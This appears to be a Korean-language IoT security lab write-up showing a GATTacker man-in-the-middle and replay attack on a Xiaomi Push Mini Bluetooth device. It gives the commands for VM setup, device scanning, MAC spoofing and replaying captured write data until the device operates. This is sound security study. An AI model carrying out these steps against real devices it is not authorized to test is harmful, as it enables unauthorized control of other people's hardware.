# Gattacker MITM (Push Mini)

Created: 2022년 6월 19일 오후 3:34
Tags: bluetooth

## 1. 제품 정보

제조사 : Push Mini

지원 통신 모듈 : Bluetooth

## 2. blteJuice MITM 공격

### 환경구축

- AttifyOS v3.0 on VM (Slave용, Host용)
- Miaomi Push Mini (BlueTooth)
- BLE USB Dongle (CRS8510 V4.0) 2개
- VMware 설정
    
    Virtual Machine Settings → USB Controller
    
    Share Bluetooth devices with the virtual machine 체크 해제
    
    ![Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled.png](Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled.png)
    

### 사전 설치작업 (Slave, Host)

<aside>
💡 [AttifyBlog - GATTacker](https://blog.attify.com/hacking-bluetooth-low-energy/) 링크

</aside>

[D2T3 - Slawomir Jasek - Blue Picking - Hacking Bluetooth Smart Locks.pdf](Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/D2T3_-_Slawomir_Jasek_-_Blue_Picking_-_Hacking_Bluetooth_Smart_Locks.pdf)

1 **단계 :** node 및 npm을 설치합니다.

```bash
# sudo apt-get install bluetooth bluez libbluetooth-dev libudev-dev
```

2 **단계 :**  bleno와 noble을 설치합니다.

```bash
# npm install bleno
# npm install noble
```

3 **단계 :**  Gattacker를 설치합니다.

```bash
# npm install gattacker
```

4 **단계 :** 가상머신은 Slave용, Host용 두 가지가 필요하므로, 다른 가상머신에도 동일한 단계를 반복하여 위와 같이 필요한 파일들을 설치해줍니다.

5 **단계 :** 완료되면 Bluetooth Dongle을 연결하고 sudo hciconfig 명령어를 통해 연결한 장치가 잘 잡히는지 확인합니다. 추가 단계를 위해 gattacker 폴더로 이동합니다.

```bash

# sudo hciconfig 
# cd node_modules/gattacker
```

![Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled%201.png](Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled%201.png)

6 **단계 :**  gattacker 구성을 위해  config.env 파일을 편집해야합니다.

```bash
# gedit config.env
```

7 **단계 :**  NOBLE_HCI_DEVICE_ID 주석을 해제하고 Bluetooth Dongle이 인식된 hciX(X : 번호) 값을 설정하여 저장합니다.

![Slave 가상머신 구성](Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled%202.png)

Slave 가상머신 구성

 - 추가로 Slave 가상 머신의 IP 주소를 확인합니다.

![Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled%203.png](Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled%203.png)

**8 단계 :** 이제 Host 가상 머신에서 Bluetooth Dongle을 연결하고 위 단계를 수행합니다. 그리고 config.env 파일을 아래와 같이 설정합니다.

완료되면 `WS_SLAVE`에서 이미지와 같이 슬레이브 머신의 IP 주소로 바꿉니다.

- 주석 해제 `BLENO_HCI_DEVICE_ID`
- 주석 해제 `NOBLE_HCI_DEVICE_ID`

`hciX`값에 할당합니다.

완료되면 `WS_SLAVE`에서 이미지와 같이 슬레이브 머신의 IP 주소로 바꿉니다.

![Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled%204.png](Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled%204.png)

Host 가상 머신의 구성이 완료되면 config.env 파일을 저장합니다. 이제 Gattacker를 사용하여 일부 IoT 장비를 활용한 준비가 완료되었습니다.

### **Gattacker를 사용하여 장치 정보를 스캔하고 저장 :**

**수행 할 단계**

**1 단계 :** Slave 가상머신을 열고 `ws-slave.js`아래와 같이 시작 합니다.

```bash
# sudo node ws-slave.js
```

![Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled%205.png](Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled%205.png)

**2 단계 :** 이제 Host 가상머신에서 gattacker 폴더로 이동하고 아래와 같이 스캔을 시작합니다.

```bash
# sudo node scan.js // 스캔 명령
```

![Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled%206.png](Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled%206.png)

스캔을 시작하면 주변 Bluetooth 통신을 하는 장비들이 보낸 advertise 값을 통해 장비들이 스캔되고 해당 데이터(advertise)는 /node_modules/gattacker/devices/ 디렉토리 내에 저장됩니다.

![Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled%207.png](Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled%207.png)

이제 Mini Push의 서비스를 저장해 봅니다.

```bash
# sudo node scan d7712e66a634
```

![Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled%208.png](Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled%208.png)

 - Mini Push의 advertise, service 데이터가 저장되었는지 확인합니다.

![Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled%209.png](Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled%209.png)

 - Mini Push의 advertise 데이터를 확인합니다.

![Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled%2010.png](Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled%2010.png)

 - Mini Push의 service 데이터를 확인합니다.

![Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled%2011.png](Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled%2011.png)

### **gattacker를 사용하여 정보 덤프 및 재생 :**

**수행 할 단계**

**1 단계 :** `MAC Spoofing`진행을 위해 컴파일 진행 및 `bdaddr` 실행 파일을 생성하고 path를 설정합니다.

```bash
# sudo make 
# sudo cp bdaddr /usr/local/sbin/
```

![Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled%2012.png](Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled%2012.png)

**2 단계 :** `MAC Spoofing` 을 수행한다.

```bash
# sudo ./mac_adv -a [devices/advertise-data] -s [devices/service-data]
# sudo ./mac_adv -a devices/d7712e66a634_CLPM-G03.adv.json -s devices/d7712e66a634.srv.json
```

 

![Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled%2013.png](Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled%2013.png)

**3 단계 :** 이제 휴대폰에서 Xiaomi - MiniBig 앱을 열고 장치를 검색 및 기능을 수행합니다.

**4 단계 :** 이제 장치에 연결하고 호스트 컴퓨터에서 다음과 같이 시각화 할 수 있고, Push Mini 사용 시 Write data 값을 확인할 수 있습니다.

![Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled%2014.png](Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled%2014.png)

이제 **ctrl + c로** 종료하십시오.

**5 단계 :** 이제 덤프 폴더로 이동하여 저장된 덤프 데이터를 확인합니다.

![Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled%2015.png](Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled%2015.png)

**6 단계 :** Replay Attack을 하기 위해 Write Data 를 제외한 영역에 대해서는 삭제하고 저장합니다.

![Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled%2016.png](Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled%2016.png)

**7 단계 :** Replay Attack(재생공격) 을 아래 명령어를 이용하여 수행합니다.

```bash
# nodereplay.js -i dump/d7712e66a634.log  -p d7712e66a634 -s devices/d7712e66a634.srv.json
```

![Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled%2017.png](Gattacker%20MITM%20(Push%20Mini)%20057c741ff59b46bcab0bde0f7c751235/Untitled%2017.png)

해당 명령을 수행 시 Replay Attack(재생공격)이 수행되며, Push Mini 장비가 작동합니다.